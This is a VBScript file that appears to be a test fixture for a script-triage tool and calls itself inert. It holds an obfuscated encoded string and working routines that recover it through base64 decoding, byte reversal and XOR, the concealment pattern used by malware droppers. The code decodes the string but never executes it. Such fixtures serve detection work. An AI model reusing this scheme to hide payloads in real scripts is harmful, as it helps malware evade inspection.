Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ba857003 = "k4aDyd+D0tPfgYGBgd7KgoCGk5S7hYarlJSClZOJkq+7hI6LhZK3u5SVgpSyu92k2o+Thpe4gouOgZvfg9LT34GBgYHeyIWGq5SUgpWTiZKv2pOJgoCGuJWClJKbk4aDydPf1tXS3oHTyIOOi4aRiY7JgouXioafgsnfg9LT34GBgYHeyMjdlJeTk4/ai5WSm9+D0tPfgYGBgd7KiYCOhpeKhoTag464iYCOhpeKhoSb1dqTiZKIhLiCgIaTlJvWydLJk5SCkpaCtZeTk6+JjrDJl5OTr4mOsNqVgpOXhoOGm4KLjoG4gpOOlZDLgpOIioKVuIKVjpKWhIbalJeCk5Sb1tqR"
Const Codec_ba857003 = "base64_chunks|reverse_then_xor|e7"

Function Base64_ba857003(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_ba857003", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_ba857003 = outputBytes
End Function

Function Load_ba857003()
  Dim partWidth, packedText
  partWidth = (Len(Material_ba857003) + 3) \ 4
  packedText = Mid(Material_ba857003, 1, partWidth) & Mid(Material_ba857003, partWidth + 1, partWidth) & Mid(Material_ba857003, partWidth * 2 + 1, partWidth) & Mid(Material_ba857003, partWidth * 3 + 1)
  Load_ba857003 = Base64_ba857003(packedText)
End Function

Function Decode_ba857003(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(UBound(s) - i) = s(i) Xor 231
  Next
  Decode_ba857003 = result
End Function

Function Recover_ba857003()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = Empty
      s = Load_ba857003()
      d = Decode_ba857003(s)
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_ba857003 = t
End Function

Function Inspect_ba857003()
  Inspect_ba857003 = Recover_ba857003()
End Function
